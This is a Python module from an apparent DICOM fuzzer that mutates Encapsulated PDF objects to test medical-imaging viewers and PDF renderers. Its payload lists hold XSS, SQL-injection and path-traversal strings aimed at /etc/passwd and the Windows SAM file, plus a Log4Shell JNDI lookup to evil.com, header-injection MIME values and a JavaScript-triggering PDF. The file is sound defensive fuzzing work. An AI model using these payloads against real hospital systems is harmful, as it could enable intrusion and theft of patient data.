"""Encapsulated PDF Fuzzer - DICOM Encapsulated Document Mutations.

Category: modality-specific (Encapsulated PDF)

Attacks:
- Document size/length boundary attacks on EncapsulatedDocument (0042,0011)
- MIME type mismatch at DICOM-to-renderer handoff
- Non-PDF payload injection in valid DICOM wrapper
- Document metadata corruption (DocumentTitle, ConceptNameCodeSequence)
- PDF-internal structure corruption (xref, streams, startxref, page tree)
- Type confusion on EncapsulatedDocument (non-bytes types)
"""

from __future__ import annotations

import random

from pydicom.dataset import Dataset
from pydicom.sequence import Sequence

from dicom_fuzzer.utils.logger import get_logger

from .base import FormatFuzzerBase

logger = get_logger(__name__)

_ENCAPSULATED_PDF_SOP_CLASS_UID = "1.2.840.10008.5.1.4.1.1.104.1"

# Magic bytes for non-PDF file formats
_FAKE_PAYLOADS = {
    "jpeg": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00",
    "png": b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR",
    "zip": b"PK\x03\x04\x14\x00\x00\x00",
    "elf": b"\x7fELF\x02\x01\x01\x00",
    "pdf_garbage": b"%PDF-1.4\n" + b"\x00" * 64,
    "xml": b'<?xml version="1.0"?>\n<root><exploit/></root>',
    "html": b"<html><script>alert(1)</script></html>",
}

_INJECTION_PAYLOADS = [
    "<script>alert('xss')</script>",
    "'; DROP TABLE patients; --",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "${jndi:ldap://evil.com/a}",
    "A" * 10000,
    "",
    "\x00" * 16,
    "\n" * 500,
]


class EncapsulatedPdfFuzzer(FormatFuzzerBase):
    """Fuzzes DICOM Encapsulated PDF objects to test document handling robustness.

    Encapsulated PDF uses EncapsulatedDocument (0042,0011) instead of
    PixelData. The viewer must parse the DICOM wrapper, extract the PDF
    bytes, then hand them to a PDF renderer -- two parsers in series.
    """

    def __init__(self) -> None:
        """Initialize the encapsulated PDF fuzzer with attack strategies."""
        super().__init__()
        self.mutation_strategies = [
            self._document_size_attack,
            self._mime_type_mismatch,
            self._malformed_pdf_injection,
            self._pdf_metadata_corruption,
            self._pdf_structure_corruption,
            self._type_confusion,
        ]

    @property
    def strategy_name(self) -> str:
        """Return the strategy name for identification."""
        return "encapsulated_pdf"

    def can_mutate(self, dataset: Dataset) -> bool:
        """Only mutate Encapsulated PDF Storage datasets."""
        sop_class = getattr(dataset, "SOPClassUID", None)
        return str(sop_class) == _ENCAPSULATED_PDF_SOP_CLASS_UID

    def mutate(self, dataset: Dataset) -> Dataset:
        """Apply encapsulated PDF mutations to the dataset.

        Args:
            dataset: The DICOM dataset to mutate

        Returns:
            Mutated dataset with document payload corruptions

        """
        num_strategies = random.randint(1, 2)
        selected = random.sample(self.mutation_strategies, num_strategies)

        for strategy in selected:
            try:
                dataset = strategy(dataset)
            except Exception as e:
                logger.debug("Encapsulated PDF mutation failed: %s", e)

        return dataset

    def _document_size_attack(self, dataset: Dataset) -> Dataset:
        """Test encapsulation size boundaries on EncapsulatedDocument (0042,0011)."""
        attack = random.choice(
            [
                "zero_length",
                "single_byte",
                "truncated",
                "remove_tag",
                "oversized_padding",
            ]
        )

        try:
            if attack == "zero_length":
                dataset.EncapsulatedDocument = b""
            elif attack == "single_byte":
                dataset.EncapsulatedDocument = b"\x00"
            elif attack == "truncated":
                doc = getattr(dataset, "EncapsulatedDocument", b"%PDF-1.4 test")
                if isinstance(doc, bytes) and len(doc) > 1:
                    cut = random.randint(1, len(doc) // 2)
                    dataset.EncapsulatedDocument = doc[:cut]
                else:
                    dataset.EncapsulatedDocument = b"\x00"
            elif attack == "remove_tag":
                if "EncapsulatedDocument" in dataset:
                    del dataset.EncapsulatedDocument
            elif attack == "oversized_padding":
                doc = getattr(dataset, "EncapsulatedDocument", b"%PDF-1.4 test")
                if isinstance(doc, bytes):
                    dataset.EncapsulatedDocument = doc + b"\x00" * 1_000_000
                else:
                    dataset.EncapsulatedDocument = b"\x00" * 1_000_000
        except Exception as e:
            logger.debug("Document size attack failed: %s", e)

        return dataset

    def _mime_type_mismatch(self, dataset: Dataset) -> Dataset:
        """Set MIMETypeOfEncapsulatedDocument (0042,0012) to wrong content type."""
        attack = random.choice(
            [
                "wrong_type",
                "empty",
                "overlong",
                "injection",
                "remove_tag",
            ]
        )

        try:
            if attack == "wrong_type":
                dataset.MIMETypeOfEncapsulatedDocument = random.choice(
                    [
                        "image/jpeg",
                        "text/html",
                        "application/xml",
                        "application/octet-stream",
                        "text/plain",
                        "application/x-executable",
                    ]
                )
            elif attack == "empty":
                dataset.MIMETypeOfEncapsulatedDocument = ""
            elif attack == "overlong":
                dataset.MIMETypeOfEncapsulatedDocument = "application/" + "x" * 10000
            elif attack == "injection":
                dataset.MIMETypeOfEncapsulatedDocument = random.choice(
                    [
                        "application/pdf\x00image/jpeg",
                        "application/pdf; charset=utf-8\n\nmalicious",
                        "application/pdf\r\nX-Injected: true",
                        "../../../etc/passwd",
                    ]
                )
            elif attack == "remove_tag":
                if "MIMETypeOfEncapsulatedDocument" in dataset:
                    del dataset.MIMETypeOfEncapsulatedDocument
        except Exception as e:
            logger.debug("MIME type mismatch attack failed: %s", e)

        return dataset

    def _malformed_pdf_injection(self, dataset: Dataset) -> Dataset:
        """Keep valid DICOM wrapper but inject non-PDF payload."""
        attack = random.choice(list(_FAKE_PAYLOADS.keys()))

        try:
            dataset.EncapsulatedDocument = _FAKE_PAYLOADS[attack]
        except Exception as e:
            logger.debug("Malformed PDF injection failed: %s", e)

        return dataset

    def _pdf_metadata_corruption(self, dataset: Dataset) -> Dataset:
        """Corrupt DocumentTitle and ConceptNameCodeSequence metadata."""
        attack = random.choice(
            [
                "title_injection",
                "title_boundary",
                "concept_name_corrupt",
                "concept_name_remove",
                "burned_in_annotation",
            ]
        )

        try:
            if attack == "title_injection":
                dataset.DocumentTitle = random.choice(_INJECTION_PAYLOADS)
            elif attack == "title_boundary":
                dataset.DocumentTitle = random.choice(
                    [
                        "",
                        "A" * 65536,
                        "\x00" * 100,
                        "Title\x00Hidden",
                    ]
                )
            elif attack == "concept_name_corrupt":
                seq_item = Dataset()
                seq_item.CodeValue = random.choice(
                    [
                        "",
                        "INVALID_CODE",
                        "\x00" * 16,
                        "A" * 10000,
                    ]
                )
                seq_item.CodingSchemeDesignator = random.choice(
                    [
                        "",
                        "FAKE",
                        "\x00",
                    ]
                )
                seq_item.CodeMeaning = random.choice(_INJECTION_PAYLOADS)
                dataset.ConceptNameCodeSequence = Sequence([seq_item])
            elif attack == "concept_name_remove":
                if "ConceptNameCodeSequence" in dataset:
                    del dataset.ConceptNameCodeSequence
            elif attack == "burned_in_annotation":
                dataset.BurnedInAnnotation = random.choice(
                    [
                        "INVALID",
                        "",
                        "YES\x00NO",
                        "A" * 1000,
                    ]
                )
        except Exception as e:
            logger.debug("PDF metadata corruption failed: %s", e)

        return dataset

    def _pdf_structure_corruption(self, dataset: Dataset) -> Dataset:
        """Inject structurally malformed PDF bytes that target the PDF parser."""
        attack = random.choice(
            [
                "corrupt_xref",
                "truncated_stream",
                "bad_startxref",
                "recursive_pages",
                "js_openaction",
            ]
        )

        try:
            if attack == "corrupt_xref":
                dataset.EncapsulatedDocument = (
                    b"%PDF-1.4\n"
                    b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
                    b"xref\n0 999\nGARBAGE XREF DATA\n"
                    b"trailer\n<< /Size 999 /Root 1 0 R >>\n"
                    b"startxref\n42\n%%EOF"
                )
            elif attack == "truncated_stream":
                dataset.EncapsulatedDocument = (
                    b"%PDF-1.4\n1 0 obj\n<< /Length 99999 >>\nstream\nshort data"
                    # Missing endstream/endobj
                )
            elif attack == "bad_startxref":
                dataset.EncapsulatedDocument = (
                    b"%PDF-1.4\n"
                    b"1 0 obj\n<< /Type /Catalog >>\nendobj\n"
                    b"xref\n0 1\n0000000000 65535 f \n"
                    b"trailer\n<< /Size 1 /Root 1 0 R >>\n"
                    b"startxref\n999999999\n%%EOF"
                )
            elif attack == "recursive_pages":
                dataset.EncapsulatedDocument = (
                    b"%PDF-1.4\n"
                    b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
                    b"2 0 obj\n<< /Type /Pages /Kids [2 0 R] /Count 1 >>\n"
                    b"endobj\n%%EOF"
                )
            elif attack == "js_openaction":
                dataset.EncapsulatedDocument = (
                    b"%PDF-1.4\n"
                    b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R "
                    b"/OpenAction << /S /JavaScript "
                    b"/JS (app.alert\\('fuzz'\\)) >> >>\nendobj\n"
                    b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\n"
                    b"endobj\n%%EOF"
                )
        except Exception as e:
            logger.debug("PDF structure corruption failed: %s", e)

        return dataset

    def _type_confusion(self, dataset: Dataset) -> Dataset:
        """Set EncapsulatedDocument to non-bytes types to test serialization."""
        attack = random.choice(
            [
                "int_document",
                "str_document",
                "dataset_document",
                "none_document",
            ]
        )

        try:
            if attack == "int_document":
                dataset.EncapsulatedDocument = 42
            elif attack == "str_document":
                dataset.EncapsulatedDocument = "not bytes at all"
            elif attack == "dataset_document":
                dataset.EncapsulatedDocument = Dataset()
            elif attack == "none_document":
                dataset.EncapsulatedDocument = None
        except Exception as e:
            logger.debug("Type confusion attack failed: %s", e)

        return dataset


__all__ = ["EncapsulatedPdfFuzzer"]
